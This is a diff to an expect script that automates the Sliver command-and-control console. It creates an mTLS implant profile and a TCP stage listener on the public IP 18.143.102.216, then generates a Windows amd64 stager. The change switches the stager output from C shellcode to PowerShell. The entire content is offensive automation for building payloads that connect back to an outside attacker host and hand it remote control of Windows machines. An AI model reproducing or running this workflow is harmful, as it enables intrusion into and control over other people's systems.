@@ -23,7 +23,12 @@ sleep 0.1
 send "profiles new --mtls 18.143.102.216:8080 --skip-symbols --format shellcode --arch amd64 win64\r"
 send "stage-listener --url tcp://18.143.102.216:1234 --profile win64\r"
 send "jobs\r"
-send "generate stager --lhost 18.143.102.216 --lport 1234 --protocol tcp --arch amd64 --format c --save $payload_c\r"
+
+# this following is using for creating shellcode in c format to comple exe
+# send "generate stager --lhost 18.143.102.216 --lport 1234 --protocol tcp --arch amd64 --format c --save $payload_c\r"
+
+# this following is using for creating shellocde in ps1 format
+send "generate stager --lhost 18.143.102.216 --lport 1234 --protocol tcp --arch amd64 --format ps1 --save $payload_c\r"
 
 # Wait for the file $payload_c to exist
 set timeout 300
